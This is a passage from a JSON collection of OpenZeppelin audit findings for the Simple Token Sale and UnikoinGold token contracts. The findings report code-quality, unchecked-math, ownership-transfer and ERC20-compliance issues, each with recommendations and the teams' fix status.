      "content": "Contracts [`TokenSaleMock`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/TokenSaleMock.sol) and [`FutureTokenSaleLockBoxMock`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/FutureTokenSaleLockBoxMock.sol) have almost identical content duplicating the code that implements time manipulation behaviour. Not only increases it the maintenance costs but also brings the risk of updating only one of the contracts and skipping another.\n\n\nWe recommend extracting the common logic into an abstract `Mock` contract that will be a base class for both `TokenSaleMock` and `FutureTokenSaleLockBoxMock`.\n\n\n**Update**: *While the Simple Token team agree with the points, they do not feel that this is a concern that merits changing the code.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11961",
      "title": "Possible to initiate Ownership Transfer with the null address",
      "impact": "LOW",
      "content": "Function [`initiateOwnershipTransfer`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Owned.sol#L41) allows initiating a transfer passing the `0x0` address as a `_proposedOwner.` This action will be ineffective as it’s impossible to call the [`completeOwnershipTransfer`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Owned.sol#L50) function from the `0x0`address. The null address is also used as a special value to mark that the transfer was completed so it’d be the best if it could be set only by internal invocation.\n\n\nIf the contract could be ownerless a confirmation step needs to be skipped for the `0x0` address. Otherwise, we recommend adding a precondition check preventing initiation of the ownership transfer with the`0x0` value.\n\n\n**Update**: *Fixed in this [pull request](https://github.com/OpenSTFoundation/SimpleTokenSale/pull/13). The team decided to postpone merging the changes to the master branch as it will require excessive refactor of all the tests.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11960",
      "title": "Access modifier conflicting with documentation and function body",
      "impact": "LOW",
      "content": "The `onlyOps` modifier restricts access to the [`processAllocation`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Trustee.sol#L163) function, allowing only an account that matches the `opsAddress`. Such a behaviour conflicts with the documentation that describes the function as *Push model which allows \\_***the owner**** to transfer tokens to the beneficiary\\_. Moreover, this is also inconsistent with the function body which contains logic that [requires a message sender to be the owner or the admin](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Trustee.sol#L169).\n\n\nWe recommend resolving the conflict by either removing the `onlyOps`restriction access modifier or updating the documentation and removing irrelevant code fragments [lines 167–170](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Trustee.sol#L167)) from the function body.\n\n\n**Update**: *Fixed in [this](https://github.com/OpenSTFoundation/SimpleTokenSale/commit/dab5d0488bd08b7206813f7c8be5d97191e79bae#diff-ecf32016a92b8b06ac2a5eb583cc4ad1R159) commit by updating comments and removing the unreachable code.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11959",
      "title": "Missing validation of the TOKEN_SALE constant",
      "impact": "LOW",
      "content": "In the [`TokenSale`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/TokenSale.sol#L128) contract, there is validation for most of the configuration constants which is a very good practice. The validation skips checking the correctness of`TOKENS_SALE` parameter which can allow creation of a contract that is unable to sell any tokens at all.\n\n\nWe recommend adding the missing validation to the `TokenSale` constructor.\n\n\n**Update**: *The Simple Token team indicated that, `TOKENS_SALE` is effectively validated by (1) the constructor confirming that all of the token values add up to `TOKENS_MAX` and (2) `TokenSale.initialize` confirming that the balance of `TokenSale` is equal to `TOKENS_SALE`. It is true that if `TOKEN_SALE` were set to `0`in `TokenSaleConfig` (and other values adjusted) and if we either transfer `0 ST`to `TokenSale` or do not transfer anything at all, those validations would pass. However, the team thinks they must surely be allowed to assume that their config contract is correct.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11958",
      "title": "Two unchecked math operations involving constant values",
      "impact": "MEDIUM",
      "content": "There are some math operations that aren’t checked like calculating [the number of bought tokens](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/TokenSale.sol#L305) or[the actual cost for the partial amount of tokens](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/TokenSale.sol#L316). It’s always better to be safe and perform checked operations.\n\n\nIt’s worth mentioning that the safety of all the other calculations were correctly ensured with the [`SafeMath`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/SafeMath.sol) library.\n\n\nConsider using the [`SafeMath`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/SafeMath.sol) library, or performing pre-condition checks on **all** of the math operations.\n\n\n**Update**: *Fixed in [this](https://github.com/OpenSTFoundation/SimpleTokenSale/commit/dab5d0488bd08b7206813f7c8be5d97191e79bae) commit by introducing the \\_`PURCHASE_DIVIDER` constant.*",
      "summary": "\nThis bug report is about the OpenSTFoundation SimpleTokenSale. There are some math operations that are not checked like calculating the number of bought tokens or the actual cost for the partial amount of tokens. The safety of all the other calculations was ensured with the SafeMath library. To fix the issue, it is suggested to use the SafeMath library or perform pre-condition checks on all of the math operations. The issue was resolved with the introduction of the PURCHASE_DIVIDER constant in a commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11957",
      "title": "Unchecked assumption that trustee and token have the same owner",
      "impact": "MEDIUM",
      "content": "In the[`reclaimTokens`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Trustee.sol#L198) function, there is a token transfer to the `trustee`contract owner, but according to [the comment above](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Trustee.sol#L197) it should be transferred to the `tokenContract` owner: *Note that the trustee should be able to move tokens even before the token is finalised because SimpleToken allows sending back to owner specifically.* This statement is only true if the token contract owner is the same as trustee owner, but this precondition is not enforced anywhere.\n\n\nWe recommend replacing `owner` with `tokenContract.owner` [in line 206](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/Trustee.sol#L206) to specify the transfer target precisely.\n\n\n**Update**: *Fixed in [this](https://github.com/OpenSTFoundation/SimpleTokenSale/commit/dab5d0488bd08b7206813f7c8be5d97191e79bae) commit improving both the [TokenSale](https://github.com/OpenSTFoundation/SimpleTokenSale/commit/dab5d0488bd08b7206813f7c8be5d97191e79bae#diff-2433a0604f99868d5cc0b4064df7ae93R438) and [Trustee](https://github.com/OpenSTFoundation/SimpleTokenSale/commit/dab5d0488bd08b7206813f7c8be5d97191e79bae#diff-ecf32016a92b8b06ac2a5eb583cc4ad1R201)contracts.*",
      "summary": "\nThis bug report is about the `reclaimTokens` function in the OpenSTFoundation's SimpleTokenSale contract. The function is supposed to transfer tokens to the token contract owner, but instead it is transferring them to the trustee contract owner. This is incorrect, as the token contract owner and trustee contract owner may not be the same. To fix this, the code should be changed to specify the transfer target precisely, replacing `owner` with `tokenContract.owner` in line 206. This issue has been fixed in the latest commit, improving both the TokenSale and Trustee contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11956",
      "title": "Sale can end while being paused",
      "impact": "MEDIUM",
      "content": "The [`hasSaleEnded`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/TokenSale.sol#L215) function can change its return value from false to true during the pause period while there should be an extension of the duration of the token sale. The update of `endTime` is done only after calling the `unpause`function and the state during the pause period may be misreported.\n\n\nA consequence of this could be losing the ability to update whitelist in [`updateWhitelist`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/TokenSale.sol#L234) function during the pause period.\n\n\nWe recommend updating `hasSaleEnded` function to consider the pause period.\n\n\n**Update**: *Fixed in [these two commits](https://github.com/OpenSTFoundation/SimpleTokenSale/pull/11/commits).*",
      "summary": "\nThis bug report concerns the `hasSaleEnded` function in the SimpleTokenSale repository on GitHub. This function can change its return value from false to true during the pause period, while the duration of the token sale should be extended. The update of the `endTime` is done only after calling the `unpause` function, and during the pause period, the state may be misreported. This could lead to the inability to update the whitelist in the `updateWhitelist` function during the pause period.\n\nTo fix this bug, it is recommended to update the `hasSaleEnded` function to consider the pause period. The bug was fixed in two commits in the GitHub repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11978",
      "title": "Redundant state variables claimed and phasesClaimed",
      "impact": "LOW",
      "content": "State variables `claimed` and `phasesClaimed` in `TokenDistribution` hold the same information: whether an address has claimed a particular phase for the presale. The former keeps track of both through a mapping `phase =&gt; address =&gt; isClaimed`, while the latter stores the last phase claimed for a given address. Given that phases can only be claimed incrementally (i.e. phase N cannot be claimed unless phase N-1 was claimed), the following equivalence holds:\n\n\n\n```\n\n`claimed[aPhase][anAddress] == (phasesClaimed[anAddress] >= aPhase)`\n\n```\n\nConsider removing either of the two (we suggest removing `claimed`) in favour of the other to remove redundant state from the contract.\n\n\n**Update**: *Both variables were decided to be kept to reduce complexity of the `phasesClaimable` function implementation.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11977",
      "title": "Redundant state variable isVesting",
      "impact": "LOW",
      "content": "State variable `isVesting` in `TokenDistribution` is set to true for an address if and only if a participant [reached the last phase](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L240) in `claimPresaleTokens`. As such, it is straightforward to infer whether a participant is vesting or not just by checking if `phasesClaimed` for the address is equal to 10. Consider removing the redundant state variable (`isVesting`) if it will not have any other uses.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/f839c3d6b488506929f843df48b93059bd1f2e8d) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11976",
      "title": "Use of integer type to represent boolean",
      "impact": "LOW",
      "content": "State variable `isVesting` in `TokenDistribution` is defined as a map from addresses into `uint256`, though only 0 and 1 values are used as a proxy to represent boolean values. Futhermore, 0 is used to represent `true` and 1 is used to represent `false`, which is the opposite as to how boolean values are [represented in the ABI](http://solidity.readthedocs.io/en/develop/abi-spec.html), . Consider changing the type of the map values from `uint256` to `bool`, or removing the field altogether, as explained below.\n\n\n**Update**: Fixed by removing the field (as suggested below) in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/f839c3d6b488506929f843df48b93059bd1f2e8d) commit.\\_",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11975",
      "title": "Unused state variable phasesClaimable",
      "impact": "LOW",
      "content": "State variable `phasesClaimable` in `TokenDistribution` is unused. Moreover, there is a function with the same name in [L198](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L198) which shadows the getter generated by the `public` modifier, and has entirely different semantics. Consider removing the `phasesClaimable`field.\n\n\n**Update**: *Fixed in [this commit](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/d62a1b3010e2a2cc2578f1ca7c7c1ca1077f123c).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11974",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "The total number of phases in the TokenDistribution is repeated as a [magic constant](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) throughout the contract code, in [L142](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L142), [L189](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L189), [L214](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L214), [L215](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L215) and [L239](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L239).\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.\n\n\n**Update**: *Fixed all except for L142 in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/19d309aa4ef5ddc3fa367edf1dec3835ef05e793) and [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/b1d045a9a8a70f621da558b6c8dc2c66e6ac1a3b) commits.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11973",
      "title": "Confusing use of unneeded temporal variables",
      "impact": "LOW",
      "content": "Throughout the code, in many functions a **temp** variable with a calculation is defined, an assertion is performed over the temp value, and if it succeeds, then a state variable is assigned with the value `temp`. See as an example [ParticipantAdditionProxy L70](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L70):\n\n\n\n```\n\n`uint256 tempPresaleTotalSupply =\npresaleAllocationTokenCount.add(approvedPresaleParticipantsAllocations[i]);`\n`require(tempPresaleTotalSupply <= PRESALE_TOKEN_ALLOCATION_CAP);`\n`presaleAllocationTokenCount = tempPresaleTotalSupply;`\n\n```\n\nThe same happens in ParticipantAdditionProxy [L92](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L92) and [L114](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L114), and TokenDistribution [L158](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L158) and [L290](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L290).\n\n\nSince a failed assertion via **require** will revert all state changes within the transaction, it is not necessary to use this temp variable. Assigning directly to the state variable and then checking the assertion will have the same effect, and make the code shorter and easier to read. Consider removing these unneeded temporal variables.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/16a072838a5982dd99a3788ec404ff6380b30d2c) and [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/4173750ef537b8193cf7be13e6047790ad0d3a9e) commits.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11972",
      "title": "Solidity version",
      "impact": "LOW",
      "content": "Current code specifies version `pragma ^0.4.11`. We recommend changing the solidity version pragma to the latest version (`pragma solidity ^0.4.17`) to enforce the use of an up to date compiler.\n\n\n**Update**: *Updated to 0.4.15 in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/f3a38fb9bf9d006a79b62182da53e08481cca07c) commit, latest version of solidity supported by the used Truffle version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11971",
      "title": "Redundant state variables in ParticipantAdditionProxy",
      "impact": "LOW",
      "content": "For both the sale and presale participants, the [ParticipantAdditionProxy](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/65e2f6a461aee01ef23d2a99abc9b0ca00be5a7d/contracts/ParticipantAdditionProxy.sol) keeps track of whether the entire [addition process is complete](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L16-L18) (`presaleAdditionDone`,`lockedAdditionDone`, and `saleAdditionDone`), which is the [balance for each address](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L24-L26)(`presaleBalances`,`lockedBalances`, and `saleBalances`), and whether an address [has already been allocated](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L27-L29) (`presaleParticipantAllocated`,`lockedParticipantAllocated`, and `saleParticipantAllocated`).\n\n\nAssuming that each participant has a non-negative allocation, and since once a participant is allocated [it cannot be modified](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/65e2f6a461aee01ef23d2a99abc9b0ca00be5a7d/contracts/ParticipantAdditionProxy.sol#L77), then the flag stating whether a participant has been allocated can be replaced by a check of whether the balance for the address is zero or not. This allows the three`ParticipantAllocated` variables to be removed.\n\n\nFurthermore, since it is not possible to allocate balance over the pre-defined cap, and the process can only be marked as complete [when the cap is reached](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/ParticipantAdditionProxy.sol#L132), the flags and methods for ending the addition process (`presaleAdditionDone`/`lockedAdditionDone`/`saleAdditionDone`and `endPresaleParticipantAddition`/`endLockedParticipantAddition`/`endSaleParticipantAddition`) are not needed, and can be replaced by a check on whether the cap was reached.\n\n\nRemoving redundant state variables not only reduces gas costs due to reduced storage used, but also greatly simplifies the code. Consider doing so.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/a86758beb7f303544fe9a74223ba7a43adf69883) commit, though `endParticipantAddition` functions were kept for clarity.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11970",
      "title": "Install OpenZeppelin via npm",
      "impact": "LOW",
      "content": "Code from `SafeMath`, `Ownable`, `ERC20Basic`, `ERC20`, `BasicToken`, and `StandardToken` was copied from OpenZeppelin into the files [SafeMath](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/SafeMath.sol), [Ownable](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/Ownable.sol), and [Token](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/Token.sol). This violates OpenZeppelin’s MIT license, which requires the licence and copyright notice to be included if its code is used, and makes it difficult to update to a more recent version.\n\n\nConsider following the [recommended way](https://github.com/OpenZeppelin/zeppelin-solidity#getting-started) to use OpenZeppelin contracts, which is via the [zeppelin-solidity npm package](https://www.npmjs.com/package/zeppelin-solidity). This allows for any bugfixes to be easily integrated into the codebase, such as issues [375](https://github.com/OpenZeppelin/zeppelin-solidity/issues/375) and [400](https://github.com/OpenZeppelin/zeppelin-solidity/issues/400) which are fixed in the latest release and affect the Token contract.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/4739bff2ac6ab50f4dbf3af2cdb792951a6b3199) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11969",
      "title": "Fail early and loudly",
      "impact": "MEDIUM",
      "content": "In the spirit of [failing as promptly as possible](https://oncodingstyle.blogspot.com.ar/2008/10/fail-early-fail-loudly.html) in all methods, consider adding checks in functions `allocatePresaleBalances`,`allocateSaleBalances`, and`allocateLockedBalances`of **ParticipantAdditionProxy** to ensure that both arrays passed in as parameters have the same length. If the first array passed in is shorter than the second by mistake (ie if an address is missing for an allocation), then the code will silently continue.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/1d7cd26bbd4a1cfd0ce99a47d1337490df524618) commit.*",
      "summary": "\nThis bug report is about the ParticipantAdditionProxy in UnikoinGold-UKG-Contract. It suggests adding checks in the functions allocatePresaleBalances, allocateSaleBalances, and allocateLockedBalances to ensure that the two arrays passed in as parameters have the same length. If the first array is shorter than the second, the code will continue without any errors, which could lead to unexpected results. This issue has been fixed in the commit 1d7cd26bbd4a1cfd0ce99a47d1337490df524618. \n\nThe idea of adding checks to the functions mentioned is to fail early and fail loudly as suggested in the blog post “Fail Early, Fail Loudly” by On Coding Style. This means that the code should detect errors as soon as possible and alert the user with a clear error message. This can help to prevent any unexpected results or bugs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11968",
      "title": "Use SafeMath in all math operations",
      "impact": "MEDIUM",
      "content": "Though some math operations are safe, there are others that are unchecked in [TokenDistribution](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol) lines 162, 236, 294. It’s always better to be safe and perform checked operations.\n\n\nIn particular, line 235 subtracts the current phase allocation from the sender’s remaining allowance, *without checking that the minuend is greater or equal than the subtrahend*. Even though the distribution logic should not allow for this to happen, it’s highly recommended to always check that a user has enough balance when subtracting from the allowance, which is done automatically when using SafeMath.\n\n\n**Update**: *Fixed in [this](https://medium.com/p/70e33a6e9d0c/edit) commit.*",
      "summary": "\nThis bug report is about the TokenDistribution.sol file in the UnikoinGold-UKG-Contract GitHub repository. This bug is related to the math operations that are performed in lines 162, 236, and 294. The issue is that some of these operations are unchecked, which means that they can potentially cause errors in the code. In particular, line 235 subtracts the current phase allocation from the sender’s remaining allowance without checking that the minuend is greater or equal than the subtrahend. This could lead to an incorrect result, so it is highly recommended to always check that a user has enough balance when subtracting from the allowance. The issue has been resolved in a commit and the code is now safe to use.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11967",
      "title": "Split Token and Distribution into different contracts",
      "impact": "MEDIUM",
      "content": "The token Distribution process is built into the same Token contract in [TokenDistribution.sol](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol). Since the distribution is not part of the token intrinsic mechanics, it is strongly recommended to use a standard Token contract and a separate Distribution contract. This contract would start with all the tokens to distribute among users, and invoke the **transfer** method of the Token when needed.\n\n\nThis simplifies the logic of the token contract, separates different concerns among different contracts, and also reduces the attack surface for the token contract.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/90c80e803156ffb7ee05d911f346c4dce59eb2de), [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/ccba084fad7a6a40064840c2ef4757fb611ab2bd), [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/3721c4f233f10d9556a29da60c7a92561e046067) and [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/7a61852a6fd6dfd52fc49207ac92e35e1b244539) commits.*",
      "summary": "\nThis bug report is about the Token Distribution process built into the Token contract. It is suggested to use a standard Token contract and a separate Distribution contract to simplify the logic of the token contract, separate different concerns among different contracts, and reduce the attack surface for the token contract. The bug has been fixed in four different commits on the GitHub repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11966",
      "title": "Make Token ERC20 Compliant",
      "impact": "HIGH",
      "content": "There’s several ways in which the UKG token is not ERC20 compliant.\n\n\n* The `totalSupply` variable is not updated correctly. It should always contain the total token supply. For example, token balance is given to the Unikrn team [in line 138 of TokenDistribution.sol](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L138) and `totalSupply` is left unchanged. Consider updating `totalSupply` every time tokens are created or destroyed.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/eb6a2acc628506fd4fe181724bf8c80fa6233013) commit.*\n\n\n* Consider adding public `name`, `symbol` and `decimal` properties to the Token contract. Though not mandatory, they are recommended [as part of the ERC20 specification](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#token). See [OpenZeppelin’s SimpleToken](https://github.com/OpenZeppelin/zeppelin-solidity/blob/b069827bad5869ad9914772b45d5b405160079ae/contracts/examples/SimpleToken.sol) as an example.\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/513521fec88785d44e94f5781a7f1713f433b32d) and [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/12e270f62c339ca32a1e08c0c592f55828df6200) commits. Remember also to bump `version` field to 1.0 and mark it as constant 